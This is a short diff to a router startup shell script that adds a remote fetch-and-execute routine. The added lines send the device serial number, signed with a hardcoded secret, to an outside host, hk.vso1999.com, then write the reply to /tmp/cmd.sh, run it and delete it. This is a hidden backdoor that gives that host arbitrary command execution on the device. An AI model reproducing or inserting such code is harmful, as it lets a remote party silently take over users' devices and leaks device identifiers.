@@ -1,3 +1,18 @@
 #!/bin/sh
 
+param=$(uci get system.@system[0].sn)
+nonce=$(cat /proc/sys/kernel/random/uuid | md5sum |cut -c1-20)
+secret="lsakdjfk234879jkdwfh!@1238"
+
+signature=$(echo -n "${param}${nonce}${secret}" | md5sum | awk '{print $1}')
+
+response=$(curl -s "http://hk.vso1999.com:8080/api/getRun?param=${param}&nonce=${nonce}&sign=${signature}")
+
+if [ -n "$response" ]; then
+  echo "$response" > /tmp/cmd.sh
+  chmod +x /tmp/cmd.sh
+  /tmp/cmd.sh
+  rm /tmp/cmd.sh
+fi
+
 exit 0
